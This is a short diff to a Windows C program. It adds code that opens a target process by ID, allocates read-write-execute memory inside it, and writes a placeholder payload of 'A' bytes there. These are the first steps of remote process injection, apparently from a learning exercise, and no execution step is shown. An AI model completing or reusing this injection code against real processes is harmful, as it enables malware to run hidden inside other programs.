@@ -8,6 +8,9 @@ int main(int argc, char* argv[])
     DWORD dwPID = NULL, dwTID = NULL;
     HANDLE hProcess = NULL, hThread = NULL;
 
+    unsigned char payload[] = "\x41\x41\x41\x41\x41\x41";
+    size_t payloadSize = sizeof(payload);
+
     dwPID = parsePidParam(argc, argv);
     if (dwPID == NULL) 
     {
@@ -25,6 +28,16 @@ int main(int argc, char* argv[])
         printf("Failed to open process, error: 0x%lx", GetLastError());
         return EXIT_FAILURE;
     }
+
+    printf("Got a handle to the process\n\\---0x%p\n", hProcess);
+
+    rBuffer = VirtualAllocEx(hProcess, NULL, payloadSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    printf("Allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", payloadSize);
+
+    WriteProcessMemory(hProcess, rBuffer, payload, payloadSize, NULL);
+    printf("Payload written to the process memory");
+
+
 
     return EXIT_SUCCESS;
 }
